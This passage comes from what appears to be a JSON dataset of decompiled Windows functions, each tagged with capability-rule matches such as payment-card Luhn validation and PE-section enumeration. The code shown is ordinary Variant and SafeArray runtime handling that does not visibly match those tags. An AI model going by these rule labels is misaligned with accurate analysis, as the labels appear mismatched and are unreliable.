        "decompiled_code": "\nvoid __fastcall fcn.0040fa10(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uint var_ch;\n    uint var_8h;\n    \n    puStack40 = &stack0xfffffffc;\n    puStack28 = 0x40fa1f;\n    uStack24 = param_2;\n    sub.kernel32.dll_SetErrorMode();\n    uStack32 = 0x40fa82;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x40fa64;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc();\n    sub.kernel32.dll_LoadLibraryA();\n    *in_FS_OFFSET = uVar1;\n    return;\n}\n",
        "token_count": 249
    },
    "00410e58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00410e58(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x410ee7;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    fcn.00415d1c();\n    var_10h = 0;\n    var_ch._0_1_ = 0xb;\n    fcn.00415d1c();\n    var_8h = 0;\n    var_4h._0_1_ = 0xb;\n    arg_ch = &var_10h;\n    arg_8h = 1;\n    fcn.00407550();\n    fcn.0040db38(arg_8h, arg_ch);\n    fcn.00404ec4();\n    *in_FS_OFFSET = arg_8h;\n    uStack52 = 0x410eee;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 305
    },
    "00410f48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00410f48(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x410fd7;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    fcn.00415d1c();\n    var_10h = 0;\n    var_ch._0_1_ = 0xb;\n    fcn.00415d1c();\n    var_8h = 0;\n    var_4h._0_1_ = 0xb;\n    arg_ch = &var_10h;\n    arg_8h = 1;\n    fcn.00407550();\n    fcn.0040db38(arg_8h, arg_ch);\n    fcn.00404ec4();\n    *in_FS_OFFSET = arg_8h;\n    uStack52 = 0x410fde;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 306
    },
    "004113b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004113b8(int32_t arg_8h)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    \n    do {\n        uVar2 = *(arg_8h + -0x2fc + in_EAX * 8) + *(arg_8h + -0x300 + in_EAX * 8);\n        bVar1 = *(arg_8h + -0x100 + in_EAX * 4) < uVar2;\n        uVar2 = uVar2 & 0xffffff00 | bVar1;\n        in_EAX = in_EAX + -1;\n        if (!bVar1) {\n            return uVar2;\n        }\n    } while (-1 < in_EAX);\n    return uVar2;\n}\n",
        "token_count": 182
    },
    "004113e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004113e8(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    \n    uVar3 = 1;\n    piVar1 = arg_8h + -0x100 + in_EAX * 4;\n    *piVar1 = *piVar1 + 1;\n    iVar2 = *(arg_8h + -0x2fc + in_EAX * 8);\n    if (iVar2 + *(arg_8h + -0x300 + in_EAX * 8) <= *(arg_8h + -0x100 + in_EAX * 4)) {\n        if (in_EAX == 0) {\n            uVar3 = 0;\n        }\n        else {\n            *(arg_8h + -0x100 + in_EAX * 4) = iVar2;\n            uVar3 = fcn.004113e8(arg_8h);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 237
    },
    "00411444": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00411444(void)\n\n{\n    char cVar1;\n    uint16_t *in_EAX;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint plLbound;\n    uint ppvData;\n    uint var_310h;\n    int32_t plUbound;\n    uint16_t *psa;\n    uint pvarg;\n    uint var_300h;\n    uint var_2fch;\n    uint rgIndices;\n    \n    if ((*(in_EAX + 1) & 0x20) == 0) {\n        fcn.0041128c();\n    }\n    if ((*in_EAX & 0xfff) == 0xc) {\n        if ((*in_EAX & 0x4000) == 0) {\n            psa = *(in_EAX + 4);\n        }\n        else {\n            psa = **(in_EAX + 4);\n        }\n        uVar2 = *psa;\n        if (-1 < uVar2 - 1) {\n            iVar7 = 0;\n            piVar6 = &var_300h;\n            uVar5 = uVar2;\n            do {\n                sub.oleaut32.dll_SafeArrayGetLBound(psa, iVar7 + 1, piVar6 + 1);\n                fcn.0041128c();\n                sub.oleaut32.dll_SafeArrayGetUBound();\n                fcn.0041128c();\n                *piVar6 = (plUbound - piVar6[1]) + 1;\n                iVar7 = iVar7 + 1;\n                piVar6 = piVar6 + 2;\n                uVar5 = uVar5 - 1;\n            } while (uVar5 != 0);\n        }\n        if (-1 < uVar2 - 1) {\n            puVar3 = &var_2fch;\n            puVar4 = &rgIndices;\n            do {\n                *puVar4 = *puVar3;\n                puVar4 = puVar4 + 1;\n                puVar3 = puVar3 + 2;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        do {\n            cVar1 = fcn.004113b8(&stack0xfffffffc);\n            if (cVar1 != '\\0') {\n                sub.oleaut32.dll_SafeArrayPtrOfIndex();\n                fcn.0041128c();\n                fcn.0041163c();\n            }\n            cVar1 = fcn.004113e8(&stack0xfffffffc);\n        } while (cVar1 != '\\0');\n    }\n    sub.oleaut32.dll_VariantClear(in_EAX);\n    fcn.0041128c();\n    return;\n}\n",
        "token_count": 635
    },
    "0041175c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0041175c(int32_t arg_8h)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    \n    do {\n        uVar2 = *(arg_8h + -0x2fc + in_EAX * 8) + *(arg_8h + -0x300 + in_EAX * 8);\n        bVar1 = *(arg_8h + -0x100 + in_EAX * 4) < uVar2;\n        uVar2 = uVar2 & 0xffffff00 | bVar1;\n        in_EAX = in_EAX + -1;\n        if (!bVar1) {\n            return uVar2;\n        }\n    } while (-1 < in_EAX);\n    return uVar2;\n}\n",
        "token_count": 182
    },
    "0041178c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041178c(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    \n    uVar3 = 1;\n    piVar1 = arg_8h + -0x100 + in_EAX * 4;\n    *piVar1 = *piVar1 + 1;\n    iVar2 = *(arg_8h + -0x2fc + in_EAX * 8);\n    if (iVar2 + *(arg_8h + -0x300 + in_EAX * 8) <= *(arg_8h + -0x100 + in_EAX * 4)) {\n        if (in_EAX == 0) {\n            uVar3 = 0;\n        }\n        else {\n            *(arg_8h + -0x100 + in_EAX * 4) = iVar2;\n            uVar3 = fcn.0041178c(arg_8h);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 237
    },
    "004117e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004117e8(code *param_1, uint16_t *param_2)\n\n{\n    char cVar1;\n    ushort *in_EAX;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    uint plLbound;\n    uint var_31ch;\n    uint ppvData;\n    uint16_t *psa;\n    uint32_t cDims;\n    int32_t plUbound;\n    code *var_308h;\n    ushort *pvargDest;\n    uint rgsabound;\n    uint var_2fch;\n    uint rgIndices;\n    \n    var_308h = param_1;\n    pvargDest = in_EAX;\n    if ((*(param_2 + 1) & 0x20) == 0) {\n        fcn.0041128c();\n    }\n    if ((*param_2 & 0xfff) == 0xc) {\n        if ((*param_2 & 0x4000) == 0) {\n            psa = *(param_2 + 4);\n        }\n        else {\n            psa = **(param_2 + 4);\n        }\n        uVar2 = *psa;\n        cDims = uVar2;\n        if (-1 < uVar2 - 1) {\n            iVar6 = 0;\n            piVar5 = &rgsabound;\n            do {\n                sub.oleaut32.dll_SafeArrayGetLBound(psa, iVar6 + 1, piVar5 + 1);\n                fcn.0041128c();\n                sub.oleaut32.dll_SafeArrayGetUBound();\n                fcn.0041128c();\n                *piVar5 = (plUbound - piVar5[1]) + 1;\n                iVar6 = iVar6 + 1;\n                piVar5 = piVar5 + 2;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        iVar6 = sub.oleaut32.dll_SafeArrayCreate(0xc, cDims, &rgsabound);\n        if (iVar6 == 0) {\n            fcn.00410fe4();\n        }\n        fcn.0041163c();\n        *pvargDest = 0x200c;\n        *(pvargDest + 4) = iVar6;\n        if (-1 < cDims - 1) {\n            puVar3 = &var_2fch;\n            puVar4 = &rgIndices;\n            uVar2 = cDims;\n            do {\n                *puVar4 = *puVar3;\n                puVar4 = puVar4 + 1;\n                puVar3 = puVar3 + 2;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        do {\n            cVar1 = fcn.0041175c(&stack0xfffffffc);\n            if (cVar1 != '\\0') {\n                sub.oleaut32.dll_SafeArrayPtrOfIndex(psa, &rgIndices, &ppvData);\n                fcn.0041128c();\n                sub.oleaut32.dll_SafeArrayPtrOfIndex(iVar6, &rgIndices, &var_31ch);\n                fcn.0041128c();\n                (*var_308h)();\n            }\n            cVar1 = fcn.0041178c(&stack0xfffffffc);\n        } while (cVar1 != '\\0');\n    }\n    else {\n        sub.oleaut32.dll_VariantCopy(pvargDest, param_2);\n        fcn.0041128c();\n    }\n    return;\n}\n",
        "token_count": 818
    },
    "00411aac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00411aac(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    \n    puStack36 = &fcn.00411aac::pvarg;\n    puStack40 = 0x411ac4;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x411b08;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00411a68();\n    (**0x499984)();\n    fcn.00411d34();\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x411b0f;\n    uStack44 = 0x411b07;\n    fcn.0041163c();\n    return;\n}\n",
        "token_count": 207
    },
    "00412014": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00412014(void)\n\n{\n    uchar *puStack24;\n    uchar auStack20 [16];\n    \n    puStack24 = auStack20;\n    sub.oleaut32.dll_VariantInit();\n    (***0x494be0)(&puStack24);\n    fcn.00411298();\n    return 0x400;\n}\n",
        "token_count": 77
    },
    "00412050": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00412050(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    uint var_4h;\n    \n    puStack32 = &fcn.00412050::pvarg;\n    puStack36 = 0x412062;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x4120a4;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.00411a68();\n    (**0x499984)();\n    var_4h = fcn.004120f8();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x4120ab;\n    uStack40 = 0x4120a3;\n    fcn.0041163c();\n    return;\n}\n",
        "token_count": 219
    },
    "004120b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.004120b4(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    \n    uVar1 = fcn.00416178();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(3);\n        *param_2 = iStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 123
    },
    "00412b10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00412b10(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &fcn.00412b10::pvarg;\n    puStack40 = 0x412b22;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x412b67;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00411a68();\n    (**0x499984)();\n    _var_8h = fcn.00412bc8();\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x412b6e;\n    uStack44 = 0x412b66;\n    fcn.0041163c();\n    return;\n}\n",
        "token_count": 239
    },
    "00412b7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00412b7c(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    uVar1 = fcn.00416178();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(0x14);\n        *param_2 = iStack28;\n        param_2[1] = iStack24;\n    }\n    return uVar1;\n}\n",
        "token_count": 146
    },
    "00413110": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00413110(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    uint var_1h;\n    \n    puStack32 = &fcn.00413110::pvarg;\n    puStack36 = 0x413122;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x413164;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &fcn.00413110::var_1h + 1;\n    fcn.00411a68();\n    (**0x499984)();\n    var_1h._0_1_ = fcn.004131c0();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x41316b;\n    uStack40 = 0x413163;\n    fcn.0041163c();\n    return;\n}\n",
        "token_count": 255
    },
    "00413514": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00413514(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_24h;\n    uint var_20h;\n    uint var_10h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack52 = 0x4135c9;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    fcn.00415164();\n    uVar3 = var_4h;\n    iVar2 = (***0x494ab8)(var_4h, 0x400, 0, &var_10h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.004057d4();\n        cVar1 = fcn.0040b77c();\n        if (cVar1 == '\\0') {\n            fcn.00411298();\n        }\n        else {\n            _var_10h = _var_20h;\n        }\n    }\n    else if (iVar2 != 0) {\n        fcn.00411298();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.00405530(0x4135d0);\n    fcn.00405d28();\n    return;\n}\n",
        "token_count": 336
    },
    "004135d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nfloat10 fcn.004135d8(void)\n\n{\n    uchar auStack24 [4];\n    uchar auStack20 [16];\n    \n    sub.oleaut32.dll_VariantInit();\n    (***0x494be0)(auStack24);\n    fcn.00411298();\n    return CONCAT44(auStack20, 5);\n}\n",
        "token_count": 75
    },
    "00413624": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00413624(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    double dStack12;\n    \n    puStack36 = &fcn.00413624::pvarg;\n    puStack40 = 0x413636;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x413679;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00411a68();\n    (**0x499984)();\n    fVar1 = fcn.004136d4();\n    dStack12 = fVar1;\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x413680;\n    uStack44 = 0x413678;\n    fcn.0041163c();\n    return;\n}\n",
        "token_count": 228
    },
    "00413688": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00413688(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    uVar1 = fcn.00416178();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(5);\n        *param_2 = iStack28;\n        param_2[1] = iStack24;\n    }\n    return uVar1;\n}\n",
        "token_count": 142
    },
    "00413bdc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00413bdc(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack48 = 0x413cb8;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    fcn.00415164();\n    uVar3 = var_4h;\n    iVar2 = (***0x4948d8)(var_4h, 0x400, 0, &var_10h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.004057d4();\n        cVar1 = fcn.0040d1a8();\n        if (cVar1 == '\\0') {\n            fcn.004057d4();\n            cVar1 = fcn.0040b798();\n            if (cVar1 == '\\0') {\n                fcn.00411298();\n            }\n        }\n    }\n    else if (iVar2 != 0) {\n        fcn.00411298();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.00405554(0x413cbf);\n    fcn.00405d28();\n    return;\n}\n",
        "token_count": 363
    },
    "00413cc8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.00413cc8(uint arg_8h, uint arg_ch)\n\n{\n    uint pvarg;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    sub.oleaut32.dll_VariantInit(&pvarg);\n    pvarg._0_2_ = 5;\n    var_10h = arg_8h;\n    var_ch = arg_ch;\n    (***0x494be0)(&pvarg, &pvarg, 0x400, 0, 7);\n    fcn.00411298();\n    return CONCAT44(var_ch, var_10h);\n}\n",
        "token_count": 158
    },
    "00413d28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nfloat10 fcn.00413d28(void)\n\n{\n    uchar auStack24 [4];\n    uchar auStack20 [16];\n    \n    sub.oleaut32.dll_VariantInit();\n    (***0x494be0)(auStack24);\n    fcn.00411298();\n    return CONCAT44(auStack20, 7);\n}\n",
        "token_count": 75
    },
    "00413d74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00413d74(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    double dStack12;\n    \n    puStack36 = &fcn.00413d74::pvarg;\n    puStack40 = 0x413d86;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x413dc9;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00411a68();\n    (**0x499984)();\n    fVar1 = fcn.00413e24();\n    dStack12 = fVar1;\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x413dd0;\n    uStack44 = 0x413dc8;\n    fcn.0041163c();\n    return;\n}\n",
        "token_count": 234
    },
    "00413dd8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00413dd8(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    uVar1 = fcn.00416178();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(7);\n        *param_2 = iStack28;\n        param_2[1] = iStack24;\n    }\n    return uVar1;\n}\n",
        "token_count": 143
    },
    "00414174": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00414174(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack36 = 0x414220;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    fcn.00415164();\n    uVar3 = var_4h;\n    iVar2 = (***0x494c80)(var_4h, 0x400, 0, &var_10h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.004057d4();\n        cVar1 = fcn.0040b7f0();\n        if (cVar1 == '\\0') {\n            fcn.00411298();\n        }\n    }\n    else if (iVar2 != 0) {\n        fcn.00411298();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.00405530(0x414227);\n    fcn.00405d28();\n    return;\n}\n",
        "token_count": 298
    },
    "00414230": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.00414230(uint arg_8h, uint arg_ch)\n\n{\n    uint pvarg;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    sub.oleaut32.dll_VariantInit(&pvarg);\n    pvarg._0_2_ = 5;\n    var_10h = arg_8h;\n    var_ch = arg_ch;\n    (***0x494be0)(&pvarg, &pvarg, 0x400, 0, 6);\n    fcn.00411298();\n    return CONCAT44(var_ch, var_10h);\n}\n",
        "token_count": 157
    },
    "00414290": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nfloat10 fcn.00414290(void)\n\n{\n    uchar auStack24 [4];\n    uchar auStack20 [16];\n    \n    sub.oleaut32.dll_VariantInit();\n    (***0x494be0)(auStack24);\n    fcn.00411298();\n    return CONCAT44(auStack20, 6);\n}\n",
        "token_count": 74
    },
    "004142dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004142dc(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    int64_t iStack12;\n    \n    puStack36 = &fcn.004142dc::pvarg;\n    puStack40 = 0x4142ee;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x414331;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00411a68();\n    (**0x499984)();\n    fVar1 = fcn.0041438c();\n    iStack12 = ROUND(fVar1);\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x414338;\n    uStack44 = 0x414330;\n    fcn.0041163c();\n    return;\n}\n",
        "token_count": 232
    },
    "00414340": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00414340(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    uVar1 = fcn.00416178();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(6);\n        *param_2 = iStack28;\n        param_2[1] = iStack24;\n    }\n    return uVar1;\n}\n",
        "token_count": 142
    },
    "0041488c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041488c(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint *puStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint pvarg;\n    uint var_8h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_14h = 0;\n    uStack44 = 0x41494b;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = &fcn.0041488c::pvarg;\n    puStack56 = 0x4148b7;\n    sub.oleaut32.dll_VariantInit();\n    uStack60 = 0x414929;\n    iStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack56 = &stack0xfffffffc;\n    (***0x494be0)(&fcn.0041488c::pvarg);\n    fcn.00411298();\n    arg_8h = &fcn.0041488c::var_14h;\n    fcn.00405e6c();\n    fcn.00405f58(arg_8h);\n    fcn.004057d4();\n    *in_FS_OFFSET = arg_8h;\n    fcn.0041163c(0x414930);\n    return;\n}\n",
        "token_count": 353
    },
    "00414958": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
